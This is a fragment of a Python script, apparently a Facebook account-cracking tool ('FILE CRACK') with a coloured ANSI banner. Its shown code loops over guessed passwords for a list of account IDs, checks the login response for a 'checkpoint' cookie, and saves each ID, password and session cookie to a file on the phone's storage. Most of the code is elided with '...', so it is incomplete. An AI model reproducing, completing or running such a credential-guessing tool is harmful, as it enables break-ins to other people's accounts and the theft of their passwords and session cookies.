...
\033[1;37m[•] ━▷ \033[1;37mGITHUB       ◈✙◈  \033[1;37mANOX -xX
\033[1;33m[•] ━▷ \033[1;32mSTATUS       ◈✙◈  \033[1;32mFILE CRACK
\033[1;35m[•] ━▷ \033[1;35mBROTHER      ◈✙◈  \033[1;35mHONEY x ANOX
...
def setting():
    ...
    #os.system("xdg-open https://chat.whatsapp.com/C1FGP2F9QqiLL2vB02HEXT")
    if hc in ['1','01']:
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                open('/sdcard/OKanoxfile.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
                break
